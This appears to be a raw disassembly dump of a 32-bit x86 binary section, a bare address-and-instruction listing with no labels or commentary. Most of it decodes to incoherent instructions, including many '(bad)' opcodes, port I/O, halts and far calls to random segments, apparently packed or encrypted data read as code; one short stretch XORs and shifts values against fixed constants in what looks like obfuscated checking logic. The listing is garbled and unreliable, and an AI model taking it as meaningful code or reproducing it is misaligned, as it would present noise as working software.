  40e68e:	fwait
  40e68f:	sbb    edx,DWORD PTR [eax-0x5da4d280]
  40e695:	aas    
  40e696:	pop    eax
  40e697:	adc    BYTE PTR [ebp+0x1b33280e],0xd4
  40e69e:	ret    0x5236
  40e6a1:	jmp    0xd21ee8f6
  40e6a6:	out    dx,al
  40e6a7:	inc    ebp
  40e6a8:	dec    esi
  40e6a9:	push   edi
  40e6aa:	test   BYTE PTR [esi+eiz*1+0x56a131a3],bh
  40e6b1:	cmp    BYTE PTR [eax-0x50],bh
  40e6b4:	scas   al,BYTE PTR es:[edi]
  40e6b5:	sub    BYTE PTR [ebx+0x61],ch
  40e6b8:	mov    gs,edi
  40e6ba:	aam    0xa5
  40e6bc:	sbb    al,0x14
  40e6be:	jb     0x40e67d
  40e6c0:	push   0xfa197d27
  40e6c5:	fs cmc 
  40e6c7:	sub    DWORD PTR [esp+eax*2-0x26],0x30
  40e6cc:	repz hlt 
  40e6ce:	and    al,0xd0
  40e6d0:	imul   eax,eax,0x38
  40e6d3:	mov    ah,0xa6
  40e6d5:	and    DWORD PTR [ecx-0x24],ebx
  40e6d8:	mov    ebp,0xd00fcc5e
  40e6dd:	aad    0xc9
  40e6df:	les    ebp,FWORD PTR [ebx]
  40e6e1:	test   al,0x83
  40e6e3:	jno    0x40e723
  40e6e5:	in     al,0xa5
  40e6e7:	imul   edx,DWORD PTR [ecx],0x7a
  40e6ea:	sbb    eax,0xefc82400
  40e6ef:	sub    al,0xb0
  40e6f1:	pop    es
  40e6f2:	fwait
  40e6f3:	mov    eax,ds:0x802d8b11
  40e6f8:	push   esi
  40e6f9:	test   al,0xb1
  40e6fb:	push   edi
  40e6fc:	in     al,dx
  40e6fd:	add    cl,BYTE PTR [ebp+edi*4+0x742242ba]
  40e704:	cmp    esp,esi
  40e706:	stos   BYTE PTR es:[edi],al
  40e707:	jge    0x40e68b
  40e709:	shl    DWORD PTR [ebx-0x30],cl
  40e70c:	sbb    esp,DWORD PTR [ebx+0xcd7c207]
  40e712:	cdq    
  40e713:	xchg   BYTE PTR [ebx],bh
  40e715:	add    DWORD PTR [ebp-0x23],edx
  40e718:	cmp    eax,0x6d13fda3
  40e71d:	add    al,0x2e
  40e71f:	aaa    
  40e720:	out    0xac,al
  40e722:	sbb    ebx,esp
  40e724:	fwait
  40e725:	cmp    ecx,ebx
  40e727:	push   0x2f
  40e729:	out    0xf3,al
  40e72b:	(bad)  
  40e72c:	mov    esi,0x12a15a2d
  40e731:	popf   
  40e732:	mov    edx,0x59feee68
  40e737:	jl     0x40e7b3
  40e739:	test   al,0xb3
  40e73b:	add    eax,0x24762acc
  40e740:	stc    
  40e741:	and    BYTE PTR [eax],cl
  40e743:	add    al,0x80
  40e745:	push   cs
  40e746:	xchg   esi,eax
  40e747:	jge    0x40e77c
  40e749:	sbb    ebp,eax
  40e74b:	lods   al,BYTE PTR ds:[esi]
  40e74c:	cdq    
  40e74d:	xchg   ebx,eax
  40e74e:	cmp    DWORD PTR [edi-0x6ce97a7b],ebx
  40e754:	fmul   DWORD PTR [ecx*4+0x51ce92db]
  40e75b:	out    0xf7,al
  40e75d:	push   edi
  40e75e:	imul   edx
  40e760:	jbe    0x40e72c
  40e762:	pop    ecx
  40e763:	or     eax,0x941c348d
  40e768:	or     esp,DWORD PTR [edx]
  40e76a:	aas    
  40e76b:	xchg   edx,eax
  40e76d:	aam    0xfb
  40e76f:	xor    dl,BYTE PTR [ebp-0x74]
  40e772:	sub    cl,BYTE PTR [edi-0x2b]
  40e775:	sbb    BYTE PTR [ecx],bh
  40e777:	scas   al,BYTE PTR es:[edi]
  40e778:	fstp   DWORD PTR [ecx+0x3a]
  40e77b:	test   eax,0xf49e03ce
  40e780:	and    eax,0x9f21a2a9
  40e785:	add    al,0xf9
  40e787:	cmp    ebp,DWORD PTR [esi*1-0x3c7da7c2]
  40e78e:	sub    al,bl
  40e790:	xchg   ebx,eax
  40e791:	jle    0x40e7cc
  40e793:	sub    DWORD PTR [edi-0x402ff905],esi
  40e799:	cli    
  40e79a:	xchg   BYTE PTR [ebx+0x26],bh
  40e79d:	out    0x20,al
  40e79f:	jle    0x40e74f
  40e7a1:	add    DWORD PTR [esi+0x4b12c930],ebx
  40e7a7:	xchg   ecx,eax
  40e7a8:	test   al,0x9f
  40e7aa:	xor    cl,BYTE PTR [ebp+0x66]
  40e7ad:	call   0xfba:0x81b10a3c
  40e7b4:	push   ecx
  40e7b5:	lods   eax,DWORD PTR ds:[esi]
  40e7b6:	out    dx,eax
  40e7b7:	loop   0x40e745
  40e7b9:	lds    ecx,FWORD PTR [ebp-0x49]
  40e7bc:	(bad)  
  40e7bd:	lock mov esp,0x744af400
  40e7c3:	jmp    0x79be5eae
  40e7c8:	repz xchg ebx,eax
  40e7ca:	js     0x40e83d
  40e7cc:	leave  
  40e7cd:	xor    eax,0x25708617
  40e7d2:	aad    0x9f
  40e7d4:	mov    dl,0x20
  40e7d6:	aam    0x44
  40e7d8:	rol    DWORD PTR [edi+0xe],1
  40e7db:	hlt    
  40e7dc:	mov    eax,0xb7b1cc3
  40e7e1:	mov    esp,0x36555267
  40e7e6:	mov    bh,BYTE PTR [ecx]
  40e7e8:	or     al,0x88
  40e7ea:	xor    cl,BYTE PTR [esi-0x67924a15]
  40e7f0:	mov    al,ds:0x7df75c3e
  40e7f5:	xchg   edx,eax
  40e7f6:	fidiv  DWORD PTR [edi]
  40e7f8:	gs inc ebx
  40e7fa:	mov    WORD PTR [edi],?
  40e7fc:	das    
  40e7fd:	ret    
  40e7fe:	sub    BYTE PTR [eax],dh
  40e800:	xor    ebp,DWORD PTR [ebx-0x5f]
  40e803:	dec    ecx
  40e804:	xor    eax,0xcba572c2
  40e809:	push   ecx
  40e80a:	test   eax,esp
  40e80c:	and    DWORD PTR ds:0xc256cc90,esp
  40e812:	mov    dl,BYTE PTR [ecx-0x28]
  40e815:	sub    bh,BYTE PTR [esi]
  40e817:	pop    ebp
  40e818:	mov    ebx,0x4ccfd0d0
  40e81d:	jl     0x40e88d
  40e81f:	lock rol DWORD PTR [esi+0x77],0x88
  40e824:	cmp    edx,0xa1aa0956
  40e82a:	mov    dh,0xaa
  40e82c:	jno    0x40e7cb
  40e82e:	mov    eax,0x9c89fbc4
  40e833:	in     al,dx
  40e834:	(bad)  
  40e835:	pop    esi
  40e836:	inc    esi
  40e837:	jne    0x40e82a
  40e839:	or     al,0x71
  40e83b:	push   0x40e69ebb
  40e840:	(bad)  
  40e841:	jge    0x40e89f
  40e843:	in     eax,dx
  40e844:	es inc eax
  40e846:	sar    DWORD PTR [edx],cl
  40e848:	into   
  40e849:	push   esi
  40e84a:	sbb    ebp,DWORD PTR [eax]
  40e84c:	add    DWORD PTR [edi+0x62],esi
  40e84f:	jl     0x40e8b9
  40e851:	pop    ds
  40e852:	cwde   
  40e853:	imul   edi,DWORD PTR [ebp+0x14],0x1f
  40e857:	loope  0x40e8c5
  40e859:	gs (bad) 
  40e85b:	sbb    BYTE PTR [esi+0x5a],dh
  40e85e:	dec    esi
  40e85f:	mov    edx,0x5399d3cf
  40e864:	retf   
  40e865:	dec    edx
  40e866:	and    BYTE PTR [eax+0x23],ah
  40e869:	(bad)  
  40e86a:	mov    ds:0x7d4eaf58,eax
  40e86f:	test   DWORD PTR [ebx+0x3df0925b],0xf20b879e
  40e879:	jae    0x40e819
  40e87b:	pop    esi
  40e87c:	xchg   edx,eax
  40e87d:	fdivr  QWORD PTR [esi+0x1f831ff1]
  40e883:	adc    eax,0xc8d2e311
  40e888:	xchg   edx,eax
  40e889:	iret   
  40e88a:	cs lahf 
  40e88c:	cwde   
  40e88d:	mov    ds:0xed4b51bd,eax
  40e892:	xor    cl,al
  40e894:	jo     0x40e8bf
  40e896:	and    al,0xee
  40e898:	dec    edi
  40e899:	loopne 0x40e81c
  40e89b:	sbb    al,0x67
  40e89d:	retf   0xd330
  40e8a0:	and    al,0x31
  40e8a2:	or     esp,edi
  40e8a4:	inc    eax
  40e8a5:	push   esp
  40e8a6:	dec    ebx
  40e8a7:	cmp    ebp,ebx
  40e8a9:	popf   
  40e8aa:	scas   al,BYTE PTR es:[edi]
  40e8ab:	push   ebp
  40e8ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8ad:	or     edi,DWORD PTR [ebp+0x336248ac]
  40e8b3:	mov    esp,esp
  40e8b5:	sbb    ch,BYTE PTR [eax]
  40e8b7:	pusha  
  40e8b8:	mov    ebp,0xda72c5a4
  40e8bd:	lods   al,BYTE PTR ds:[esi]
  40e8be:	inc    edx
  40e8bf:	pop    edx
  40e8c0:	sbb    BYTE PTR [esi],0xd
  40e8c3:	sbb    ebp,DWORD PTR [edi+0x2f8ba6df]
  40e8c9:	jge    0x40e86b
  40e8cb:	stos   DWORD PTR es:[edi],eax
  40e8cc:	pop    ecx
  40e8cd:	cld    
  40e8ce:	cmc    
  40e8cf:	call   0xa8199a9b
  40e8d4:	fld    DWORD PTR [edi-0x3b4f979c]
  40e8da:	add    edx,DWORD PTR [edx+0x41]
  40e8dd:	call   0x4b7c05a7
  40e8e2:	xchg   esp,eax
  40e8e3:	xchg   ecx,eax
  40e8e4:	sbb    esi,0xf80ae8b7
  40e8ea:	pop    ecx
  40e8eb:	mov    DWORD PTR [edi-0x9b1a37],eax
  40e8f1:	or     DWORD PTR [eax-0x6e],ebx
  40e8f4:	loop   0x40e894
  40e8f6:	or     ah,BYTE PTR [eax]
  40e8f8:	jl     0x40e8af
  40e8fa:	inc    eax
  40e8fb:	sar    dh,1
  40e8fd:	popf   
  40e8fe:	outs   dx,DWORD PTR ds:[esi]
  40e8ff:	aam    0x46
  40e901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e902:	jge    0x40e8c7
  40e904:	mov    ebp,0x337f984
  40e909:	inc    ecx
  40e90a:	neg    BYTE PTR [edx]
  40e90c:	push   0xffffffd3
  40e90e:	sti    
  40e90f:	jmp    0xa7976d20
  40e914:	cmp    BYTE PTR ds:0x3de01471,dh
  40e91a:	inc    esp
  40e91b:	mov    ebx,0xd6a194d4
  40e920:	push   ebp
  40e921:	int    0xa1
  40e923:	sbb    BYTE PTR [ebx+0x6b1d8b94],bl
  40e929:	out    0xff,eax
  40e92b:	xor    DWORD PTR [edx+edi*4-0x7be39f8],edi
  40e932:	mov    ch,0x15
  40e934:	scas   eax,DWORD PTR es:[edi]
  40e935:	dec    esp
  40e936:	and    eax,0xed8bdb7d
  40e93b:	lds    edx,FWORD PTR [ebp+0x297e4645]
  40e941:	loop   0x40e970
  40e943:	xchg   esp,eax
  40e944:	mov    edx,0x1d1730e5
  40e949:	pop    es
  40e94a:	shr    BYTE PTR [ecx-0x5b],1
  40e94d:	sbb    BYTE PTR [edx],ah
  40e94f:	lahf   
  40e950:	retf   0x9160
  40e953:	ja     0x40e960
  40e955:	mov    dl,0xc
  40e957:	mov    ecx,0x73e5ff1
  40e95c:	cmp    al,0xfa
  40e95e:	cli    
  40e95f:	leave  
  40e960:	ret    
  40e961:	mov    ebx,0x5cf45723
  40e966:	mov    ecx,0xa28dbbbd
  40e96b:	retf   0x1b79
  40e96e:	cs out 0xfe,al
  40e971:	xor    ah,BYTE PTR [eax+0x37e8a2ff]
  40e977:	jmp    0x40e995
  40e979:	push   0xffffffbf
  40e97b:	push   ds
  40e97c:	push   edx
  40e97d:	push   edi
  40e97e:	pushf  
  40e97f:	mov    WORD PTR [eax-0x5f],ss
  40e982:	aas    
  40e983:	mov    ebx,0xb13a127
  40e988:	nop
  40e989:	sub    eax,0x352da2a9
  40e98e:	mov    al,BYTE PTR [ebp+0x7ad5888]
  40e994:	das    
  40e995:	and    edi,DWORD PTR [ecx+0x15]
  40e998:	or     BYTE PTR [ebp-0x36],ch
  40e99b:	xchg   ebx,eax
  40e99c:	loope  0x40e933
  40e99e:	pop    esp
  40e99f:	push   edi
  40e9a0:	xchg   edi,eax
  40e9a1:	mov    dl,0x5d
  40e9a3:	shl    BYTE PTR [ebx-0x26b1e256],0x71
  40e9aa:	std    
  40e9ab:	adc    dl,BYTE PTR [ebp+0x20]
  40e9ae:	iret   
  40e9af:	pop    esp
  40e9b0:	pop    edx
  40e9b1:	mov    bl,0xdf
  40e9b3:	loop   0x40e988
  40e9b5:	add    al,0x9f
  40e9b7:	stos   DWORD PTR es:[edi],eax
  40e9b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9b9:	shr    BYTE PTR [ebp+0x327b734b],1
  40e9bf:	or     DWORD PTR [esi],0xfeebfa62
  40e9c5:	cmp    cl,ch
  40e9c7:	(bad)  
  40e9c9:	cmp    al,0xe4
  40e9cb:	xor    ch,dl
  40e9cd:	mov    edx,0x7ad30f5d
  40e9d2:	shr    DWORD PTR [ecx-0x67],0x25
  40e9d6:	jge    0x40e9e6
  40e9d8:	jmp    0x2f2f9b92
  40e9dd:	loop   0x40e9cc
  40e9df:	push   0xffffffb7
  40e9e1:	xchg   edi,eax
  40e9e2:	loop   0x40ea4a
  40e9e4:	in     eax,dx
  40e9e5:	outs   dx,DWORD PTR ds:[esi]
  40e9e6:	fwait
  40e9e7:	xchg   edi,eax
  40e9e8:	cdq    
  40e9e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9ea:	inc    ecx
  40e9eb:	hlt    
  40e9ec:	pop    ebx
  40e9ed:	mov    ebx,0x88d7f753
  40e9f2:	mov    ch,0x7d
  40e9f4:	in     al,dx
  40e9f5:	add    bh,ch
  40e9f7:	sahf   
  40e9f8:	adc    DWORD PTR ds:0xf8690e3d,esi
  40e9fe:	push   edx
  40e9ff:	(bad)  
  40ea00:	mov    esp,0x181c5aab
  40ea05:	and    eax,esp
  40ea07:	ins    DWORD PTR es:[edi],dx
  40ea08:	xor    ecx,DWORD PTR [edi-0x11f6e6f8]
  40ea0e:	and    eax,0x86c7ddc0
  40ea13:	ins    DWORD PTR es:[edi],dx
  40ea14:	jecxz  0x40ea52
  40ea16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea17:	bswap  ebp
  40ea19:	adc    eax,0x8da2d632
  40ea1e:	test   esp,esp
  40ea20:	aad    0x78
  40ea22:	push   edx
  40ea23:	dec    cx
  40ea25:	aad    0xd9
  40ea27:	aam    0x71
  40ea29:	leave  
  40ea2a:	jmp    0x40ea16
  40ea2c:	aas    
  40ea2d:	test   BYTE PTR [ecx-0x2f20f756],dh
  40ea33:	mov    ah,0xd2
  40ea35:	pop    ecx
  40ea36:	sar    DWORD PTR [ebx-0x2b],1
  40ea39:	cmp    ch,BYTE PTR [edx]
  40ea3b:	pop    ss
  40ea3c:	cmp    DWORD PTR [ecx-0x4f],esp
  40ea3f:	ret    
  40ea40:	enter  0xee1c,0x2d
  40ea44:	push   ss
  40ea45:	sub    bl,BYTE PTR [eax+0x269af9be]
  40ea4b:	jns    0x40ea13
  40ea4d:	mov    ebx,0xa957ff41
  40ea52:	or     eax,0xc5a955ae
  40ea57:	cmp    al,0xcf
  40ea59:	es add eax,0xcc793f21
  40ea5f:	push   esp
  40ea60:	std    
  40ea61:	lea    esi,[edx+0xcdf5cd2]
  40ea67:	gs stos BYTE PTR es:[edi],al
  40ea69:	adc    eax,0xc61ef45a
  40ea6e:	push   ds
  40ea6f:	mov    ebx,0xfaa68f56
  40ea74:	lods   eax,DWORD PTR ds:[esi]
  40ea75:	xchg   ebx,eax
  40ea76:	cmp    bl,BYTE PTR [eax-0x2d]
  40ea79:	pop    edi
  40ea7a:	sub    BYTE PTR [eax],bl
  40ea7c:	hlt    
  40ea7d:	cs retf 0x4683
  40ea81:	loopne 0x40eadc
  40ea83:	pop    ebp
  40ea84:	popf   
  40ea85:	add    eax,0x3504f0f8
  40ea8a:	dec    edi
  40ea8b:	sub    esi,DWORD PTR [ebx-0x68c5337e]
  40ea91:	mov    ah,0xb0
  40ea93:	push   ds
  40ea94:	xchg   esp,eax
  40ea95:	inc    esi
  40ea96:	dec    BYTE PTR [ebx+esi*1]
  40ea99:	frstor [ecx-0x1f153c21]
  40ea9f:	adc    ecx,DWORD PTR [edx]
  40eaa1:	add    BYTE PTR [ecx+0x24],0xa7
  40eaa5:	cmp    eax,0x8089d3df
  40eaaa:	iret   
  40eaab:	or     DWORD PTR [ebp-0x7e],esi
  40eaae:	dec    esp
  40eaaf:	mov    ch,0xa3
  40eab1:	push   0x9ebc38c4
  40eab6:	pop    edi
  40eab7:	loop   0x40eb31
  40eab9:	add    al,0x15
  40eabb:	leave  
  40eabc:	mov    BYTE PTR [ecx-0xf],cl
  40eabf:	pop    edx
  40eac0:	loop   0x40ea6d
  40eac2:	jae    0x40eaf9
  40eac4:	adc    al,0x3e
  40eac6:	aaa    
  40eac7:	xor    al,0x3a
  40eac9:	popa   
  40eaca:	mov    WORD PTR [eax-0x69],gs
  40eacd:	shl    BYTE PTR cs:[ecx],0x75
  40ead1:	(bad)  
  40ead2:	pusha  
  40ead3:	(bad)  
  40ead4:	cmp    al,BYTE PTR [ecx-0xb]
  40ead7:	adc    ebx,0xffffffd3
  40eada:	xor    al,0x2f
  40eadc:	mov    edi,0x588f7431
  40eae1:	into   
  40eae2:	sub    DWORD PTR [ebp+0x2b],esp
  40eae5:	retf   
  40eae6:	xchg   esi,eax
  40eae7:	add    DWORD PTR [ebp-0x28ac7bfd],edi
  40eaed:	xchg   ecx,eax
  40eaee:	repnz pushf 
  40eaf0:	rol    BYTE PTR es:[edi],cl
  40eaf3:	push   ss
  40eaf4:	out    0xdc,eax
  40eaf6:	sbb    BYTE PTR [eax],0xce
  40eaf9:	or     eax,0x1b58d622
  40eafe:	push   ss
  40eaff:	pop    eax
  40eb00:	xchg   ecx,eax
  40eb01:	inc    edi
  40eb02:	cmp    bl,ah
  40eb04:	xchg   ecx,eax
  40eb05:	shl    BYTE PTR [edx-0x78ee3d79],0xcc
  40eb0c:	xchg   BYTE PTR [ebx-0x2baa76fd],cl
  40eb12:	mov    edx,DWORD PTR [ebx+0x4]
  40eb15:	mov    edx,eax
  40eb17:	xor    eax,eax
  40eb19:	shl    edx,0x1e
  40eb1c:	xor    edx,0xc0000000
  40eb22:	mov    DWORD PTR [ebp-0x70],eax
  40eb25:	mov    eax,DWORD PTR [ebx]
  40eb27:	mov    DWORD PTR [ebp-0x6c],edx
  40eb2a:	mov    edx,DWORD PTR [ebx+0x4]
  40eb2d:	xor    eax,0xba699573
  40eb32:	xor    edx,0x9c0a89d8
  40eb38:	shrd   eax,edx,0x2
  40eb3c:	or     eax,DWORD PTR [ebp-0x70]
  40eb3f:	shr    edx,0x2
  40eb42:	mov    DWORD PTR [ebp-0x38],eax
  40eb45:	mov    eax,edx
  40eb47:	or     eax,DWORD PTR [ebp-0x6c]
  40eb4a:	mov    DWORD PTR [ebp-0x5c],edx
  40eb4d:	cmp    ecx,DWORD PTR [ebp-0x38]
  40eb50:	jne    0x40da02
  40eb56:	cmp    DWORD PTR [ebp-0x2c],eax
  40eb59:	je     0x41a17f
  40eb5f:	jmp    0x40da02
  40eb64:	mov    eax,DWORD PTR [esi]
  40eb66:	mov    ecx,DWORD PTR [esi+0x4]
  40eb69:	mov    ecx,eax
  40eb6b:	shl    ecx,0x1e
  40eb6e:	xor    ecx,0xc0000000
  40eb74:	mov    DWORD PTR [ebp+0x14],ecx
  40eb77:	mov    ecx,DWORD PTR [esi]
  40eb79:	mov    edx,DWORD PTR [esi+0x4]
  40eb7c:	xor    ecx,0xba699573
  40eb82:	xor    edx,0x9c0a89d8
  40eb88:	shrd   ecx,edx,0x2
  40eb8c:	xor    eax,eax
  40eb8e:	or     ecx,eax
  40eb90:	mov    eax,DWORD PTR [ebx]
  40eb92:	mov    DWORD PTR [ebp-0x68],ecx
  40eb95:	mov    ecx,DWORD PTR [ebx+0x4]
  40eb98:	jmp    0x40f122
  40eb9d:	and    eax,0x9542a757
  40eba2:	adc    bl,BYTE PTR [eax]
  40eba4:	xor    BYTE PTR [eax],bl
  40eba6:	mov    al,ds:0x650aa805
  40ebab:	shr    BYTE PTR [esi+0x16168a8e],0x3d
  40ebb2:	add    al,0x16
  40ebb4:	push   ss
  40ebb5:	call   0x876e6d34
  40ebba:	dec    ecx
  40ebbb:	mov    BYTE PTR [esi],0x2c
  40ebbe:	or     DWORD PTR [ebx],edx
  40ebc0:	cld    
  40ebc1:	sub    al,0xa
  40ebc3:	cwde   
  40ebc4:	in     eax,0x65
  40ebc6:	xchg   edi,eax
  40ebc7:	and    DWORD PTR [eax-0x15],0x5db0406a
  40ebce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebcf:	retf   
  40ebd0:	lods   al,BYTE PTR ds:[esi]
  40ebd1:	inc    edi
  40ebd2:	pop    edx
  40ebd3:	adc    al,0x9a
  40ebd5:	aad    0xf2
  40ebd7:	popa   
  40ebd8:	test   DWORD PTR [ebx+0x5497b7b0],edi
  40ebde:	jl     0x40ebb6
  40ebe0:	aaa    
  40ebe1:	mov    ds:0x76fc3640,al
  40ebe6:	cmp    DWORD PTR [eax-0x60d05a2f],eax
  40ebec:	pop    es
  40ebed:	adc    esi,0x78
  40ebf0:	push   0xc7bd5b71
  40ebf5:	call   FWORD PTR ds:0x8de05cfd
  40ebfb:	out    dx,eax
  40ebfc:	js     0x40ec58
  40ebfe:	cdq    
  40ebff:	mov    dl,0x55
  40ec01:	inc    ebx
  40ec02:	xchg   ecx,eax
  40ec03:	sub    eax,0x292b9659
  40ec08:	das    
  40ec09:	cmc    
  40ec0a:	or     eax,0xf610a73a
  40ec0f:	adc    eax,0xbebfe0b5
  40ec14:	mov    ecx,ebx
  40ec16:	or     DWORD PTR [eax-0x63],esi
  40ec19:	push   es
  40ec1a:	xor    ebx,DWORD PTR es:[ecx-0x36]
  40ec1e:	scas   eax,DWORD PTR es:[edi]
  40ec1f:	rcl    DWORD PTR [ebp+0x76],cl
  40ec22:	or     cl,dl
  40ec24:	mov    DWORD PTR [esi],0x194665ec
  40ec2a:	jmp    0x40ec5f
  40ec2c:	mov    bh,0x92
  40ec2e:	nop
  40ec2f:	(bad)  [esi+0x7202cc05]
  40ec35:	out    dx,al
  40ec36:	in     al,dx
  40ec37:	add    DWORD PTR [ebp+0x3ec148d1],eax
  40ec3d:	mov    ecx,0xa059fd56
  40ec42:	or     BYTE PTR [ecx],al
  40ec44:	dec    edi
  40ec45:	cld    
  40ec46:	in     eax,0x3f
  40ec48:	add    al,0x58
  40ec4a:	inc    edi
  40ec4b:	inc    edx
  40ec4c:	jo     0x40ec29
  40ec4e:	mov    esp,0x9ab10534
  40ec53:	data16 adc al,0xf5
  40ec56:	arpl   WORD PTR [esi],si
  40ec58:	cmp    eax,0x45f3ef06
  40ec5d:	popa   
  40ec5e:	outs   dx,DWORD PTR ds:[esi]
  40ec5f:	ret    
  40ec60:	inc    esi
  40ec61:	xchg   esi,eax
  40ec62:	mov    DWORD PTR [ebp-0xa],ecx
  40ec65:	add    bh,BYTE PTR [eax+0x39]
  40ec68:	test   BYTE PTR [ebx],0xbf
  40ec6b:	dec    ebp
  40ec6c:	pop    edi
  40ec6d:	mov    bh,0x6d
  40ec6f:	cs mov eax,0x8b1df3ef
  40ec75:	fdivr  DWORD PTR [esi+0x51b8f930]
  40ec7b:	push   ds
  40ec7c:	adc    dh,BYTE PTR [eax+0x68]
  40ec7f:	push   es
  40ec80:	adc    al,0x9b
  40ec82:	xchg   ebp,eax
  40ec83:	out    0x18,eax
  40ec85:	xchg   ecx,eax
  40ec86:	ret    
  40ec87:	mov    ebx,0x322c8fa2
  40ec8c:	xlat   BYTE PTR ds:[ebx]
  40ec8d:	jo     0x40ec11
  40ec8f:	adc    dh,bl
  40ec91:	jb     0x40ec74
  40ec93:	js     0x40ecd5
  40ec95:	push   0x37
  40ec97:	xor    eax,0x68019148
  40ec9c:	ins    BYTE PTR es:[edi],dx
  40ec9d:	imul   edi,DWORD PTR [ecx],0xd90285bd
  40eca3:	mov    bh,0xa5
  40eca5:	in     al,0x5f
  40eca7:	inc    ecx
  40eca8:	(bad)  
  40eca9:	fisttp DWORD PTR [ebx+0x19]
  40ecac:	jg     0x40ec9c
  40ecae:	cmp    ah,bh
  40ecb0:	inc    edx
  40ecb1:	call   0x4bc2:0xb55a2221
  40ecb8:	sbb    ebp,DWORD PTR [edi]
  40ecba:	cmc    
  40ecbb:	in     eax,0x7e
  40ecbd:	les    ebp,FWORD PTR [ecx]
  40ecbf:	retf   0xea9f
  40ecc2:	cdq    
  40ecc3:	hlt    
  40ecc4:	imul   eax,DWORD PTR [ebx+0x6a],0x57743583
  40eccb:	mov    ebx,0xae3c4047
  40ecd0:	imul   esp,DWORD PTR [edi+edx*2-0x7d2c8417],0x26
  40ecd8:	cmp    BYTE PTR [ebx],dh
  40ecda:	mov    BYTE PTR [eax-0x76bd2aa6],bl
  40ece0:	mov    cl,0x14
  40ece2:	hlt    
  40ece3:	rcl    BYTE PTR [ebp+0x266f7324],1
  40ece9:	pop    ebx
  40ecea:	das    
  40eceb:	pop    esi
  40ecec:	sub    BYTE PTR [ecx+0x2a09a784],dl
  40ecf2:	xor    ch,BYTE PTR [eax-0x340464e2]
  40ecf8:	imul   ecx,DWORD PTR [eax],0xffffff9b
  40ecfb:	xor    DWORD PTR [edx],edx
  40ecfd:	stc    
  40ecfe:	pushf  
  40ecff:	and    ah,dl
  40ed01:	(bad)
  40ed05:	push   0xffffff83
  40ed07:	mov    eax,0x878fc166
  40ed0c:	xchg   BYTE PTR [eax+0x131bb172],ch
  40ed12:	push   ebp
  40ed13:	push   ds
  40ed14:	xchg   edi,eax
  40ed15:	rcl    DWORD PTR [ecx+0x20],0x87
  40ed19:	es pop eax
  40ed1b:	push   edx
  40ed1c:	mov    DWORD PTR [esi-0x54],ecx
  40ed1f:	jno    0x40eca6
  40ed21:	push   cs
  40ed22:	bnd jne 0x40ecfc
  40ed25:	in     al,0xc5
  40ed27:	and    ecx,DWORD PTR ds:0x6e868d48
  40ed2d:	or     BYTE PTR ds:[ebp+0x1d37678],0x6d
  40ed35:	or     DWORD PTR [ebx-0x61],esi
  40ed38:	in     al,0x14
  40ed3a:	mov    dh,0xba
  40ed3c:	aad    0x26
  40ed3e:	stos   BYTE PTR es:[edi],al
  40ed3f:	stos   DWORD PTR es:[edi],eax
  40ed40:	leave  
  40ed41:	jmp    0x40ed4c
  40ed43:	fcmovnb st,st(5)
  40ed45:	xchg   DWORD PTR [edx],ecx
  40ed47:	int    0x45
  40ed49:	push   ebp
  40ed4a:	sbb    al,0x0
  40ed4c:	jne    0x40ed70
  40ed4e:	jne    0x40ece9
  40ed50:	mov    ebp,DWORD PTR [ecx]
  40ed52:	out    0x61,al
  40ed54:	push   ds
  40ed55:	outs   dx,DWORD PTR ds:[esi]
  40ed56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed57:	push   esp
  40ed58:	pop    edi
  40ed59:	xchg   ecx,eax
  40ed5a:	sti    
  40ed5b:	push   ss
  40ed5c:	mov    ecx,ebx
  40ed5e:	push   ecx
  40ed5f:	xchg   edx,eax
  40ed60:	mov    DWORD PTR [ecx+ebp*8-0x53dee64a],esp
  40ed67:	stc    
  40ed68:	loopne 0x40ed5a
  40ed6a:	mov    cl,0x33
  40ed6c:	mov    BYTE PTR [ebx],dl
  40ed6e:	pop    ss
  40ed6f:	mov    ds:0xe6e76d43,eax
  40ed74:	pop    ebx
  40ed75:	out    dx,eax
  40ed76:	sub    DWORD PTR [eax+0x6e],esi
  40ed79:	mov    BYTE PTR [ebx-0x18],ch
  40ed7c:	rcr    BYTE PTR [eax-0x1b041903],1
  40ed82:	adc    BYTE PTR [eax],al
  40ed84:	jecxz  0x40ed5a
  40ed86:	aam    0xc4
  40ed88:	mov    eax,DWORD PTR [eax]
  40ed8a:	jb     0x40ed14
  40ed8c:	cmp    eax,0xf91dfa86
  40ed91:	call   0xa0e3:0xabc57178
  40ed98:	mov    cs,WORD PTR [esi]
  40ed9a:	loop   0x40edee
  40ed9c:	ficomp DWORD PTR [ebp+0x2845bcd2]
  40eda2:	lds    edx,FWORD PTR [esp+esi*4]
  40eda5:	xchg   esi,eax
  40eda6:	cld    
  40eda7:	arpl   WORD PTR [ebx],di
  40eda9:	pusha  
  40edaa:	rol    BYTE PTR [ecx],0xb1
  40edad:	adc    BYTE PTR [ebp-0x27],al
  40edb0:	enter  0x2cba,0xe
  40edb4:	imul   ebp,DWORD PTR [eax],0x69
  40edb7:	jae    0x40ed40
  40edb9:	(bad)  
  40edba:	dec    eax
  40edbb:	imul   ebp,DWORD PTR ds:0x99c098d,0x8d15a68a
  40edc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edc6:	inc    ebx
  40edc7:	jo     0x40ee00
  40edc9:	repz dec eax
  40edcb:	cmp    al,0x3e
  40edcd:	add    esi,esp
  40edcf:	rcl    DWORD PTR [ebp-0x6ecf6cb0],1
  40edd5:	pop    ebx
  40edd6:	popf   
  40edd7:	xor    DWORD PTR [esi+0x6779e761],eax
  40eddd:	adc    eax,0xa70e0302
  40ede2:	xor    esp,0x1e
  40ede5:	aad    0x96
  40ede7:	or     esi,DWORD PTR [ebx+0xe]
  40edea:	imul   BYTE PTR ds:0xb7698ecd
  40edf0:	pop    ecx
  40edf1:	adc    al,0x34
  40edf3:	sub    al,0xf6
  40edf5:	addr16 jmp 0x41c943d9
  40edfb:	jecxz  0x40ee0a
  40edfd:	call   FWORD PTR [edx+0x27]
  40ee00:	ds arpl sp,si
  40ee03:	cmp    eax,DWORD PTR [ebx-0x23]
  40ee06:	pop    esp
  40ee07:	xchg   ecx,eax
  40ee08:	out    0xe2,al
  40ee0a:	loope  0x40ee34
  40ee0c:	and    eax,0x90578817
